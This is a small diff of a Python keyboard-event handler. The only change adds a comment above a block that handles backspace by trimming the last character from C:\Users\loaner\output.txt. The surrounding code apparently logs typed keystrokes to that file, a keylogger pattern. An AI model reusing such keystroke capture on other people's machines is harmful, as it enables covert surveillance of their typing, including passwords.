@@ -20,7 +20,7 @@ def on_keyboard_event(e):
             # Simulate a backspace by removing the last character in the file
             with open('C:\\Users\\loaner\\output.txt', 'r') as f:
                 content = f.read()
-            
+            # Desired path for output text file
             with open('C:\\Users\\loaner\\output.txt', 'w') as f:
                 f.write(content[:-1])
                 
